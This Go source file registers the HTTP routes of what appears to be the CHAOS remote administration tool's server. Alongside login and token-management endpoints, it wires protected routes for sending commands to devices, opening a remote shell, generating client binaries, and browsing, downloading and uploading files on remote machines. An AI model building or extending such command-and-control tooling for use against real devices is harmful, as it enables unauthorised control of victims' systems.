package http

import (
	"github.com/gin-gonic/gin"
	"github.com/sirupsen/logrus"
	"github.com/tiagorlampert/CHAOS/internal/environment"
	"github.com/tiagorlampert/CHAOS/internal/middleware"
	"github.com/tiagorlampert/CHAOS/services/auth"
	"github.com/tiagorlampert/CHAOS/services/client"
	"github.com/tiagorlampert/CHAOS/services/device"
	"github.com/tiagorlampert/CHAOS/services/token"
	"github.com/tiagorlampert/CHAOS/services/url"
	"github.com/tiagorlampert/CHAOS/services/user"
)

type httpController struct {
	Configuration  *environment.Configuration
	Logger         *logrus.Logger
	AuthMiddleware *middleware.JWT
	ClientService  client.Service
	AuthService    auth.Service
	UserService    user.Service
	DeviceService  device.Service
	TokenService   token.Service
	UrlService     url.Service
}

func NewController(
	configuration *environment.Configuration,
	router *gin.Engine,
	log *logrus.Logger,
	authMiddleware *middleware.JWT,
	clientService client.Service,
	systemService auth.Service,
	userService user.Service,
	deviceService device.Service,
	tokenService token.Service,
	urlService url.Service,
) {
	handler := &httpController{
		Configuration:  configuration,
		AuthMiddleware: authMiddleware,
		Logger:         log,
		ClientService:  clientService,
		AuthService:    systemService,
		UserService:    userService,
		DeviceService:  deviceService,
		TokenService:   tokenService,
		UrlService:     urlService,
	}

	// Public routes
	router.NoRoute(handler.noRouteHandler)
	router.GET("/", handler.landingHandler)
	router.GET("/health", handler.healthHandler)
	router.GET("/login", handler.loginHandler)
	router.POST("/auth", authMiddleware.LoginHandler)
	router.GET("/logout", authMiddleware.LogoutHandler)

	// Token controller
	tokenController := NewTokenController(log, tokenService)

	// Protected routes
	authGroup := router.Group("")
	authGroup.Use(authMiddleware.MiddlewareFunc())
	{
		// Dashboard and token management
		authGroup.GET("/dashboard", handler.dashboardHandler)
		authGroup.GET("/create-token", handler.createTokenHandler)
		authGroup.GET("/edit-token/:id", handler.editTokenHandler)
		
		// API routes for tokens
		api := authGroup.Group("/api")
		{
			api.POST("/tokens", tokenController.CreateToken)
			api.GET("/tokens/:id", tokenController.GetToken)
			api.PUT("/tokens/:id", tokenController.UpdateToken)
			api.DELETE("/tokens/:id", tokenController.DeleteToken)
			api.GET("/user/tokens", tokenController.GetUserTokens)
			api.POST("/tokens/deploy", tokenController.DeployToken)
			api.GET("/tokens/:id/analytics", tokenController.GetTokenAnalytics)
		}

		// Profile and settings
		authGroup.GET("/profile", handler.getUserProfileHandler)
		authGroup.POST("/user", handler.createUserHandler)
		authGroup.PUT("/user/password", handler.updateUserPasswordHandler)
		authGroup.GET("/settings", handler.getSettingsHandler)
		authGroup.GET("/settings/refresh-token", handler.refreshTokenHandler)

		// Legacy CHAOS features (for backward compatibility)
		authGroup.POST("/device", handler.setDeviceHandler)
		authGroup.GET("/devices", handler.getDevicesHandler)
		authGroup.GET("/client", handler.clientHandler)
		authGroup.POST("/command", handler.sendCommandHandler)
		authGroup.GET("/shell", handler.shellHandler)
		authGroup.GET("/generate", handler.generateBinaryGetHandler)
		authGroup.POST("/generate", handler.generateBinaryPostHandler)
		authGroup.GET("/explorer", handler.fileExplorerHandler)
		authGroup.GET("/download/:filename", handler.downloadFileHandler)
		authGroup.POST("/upload", handler.uploadFileHandler)
		authGroup.POST("/open-url", handler.openUrlHandler)
	}
}
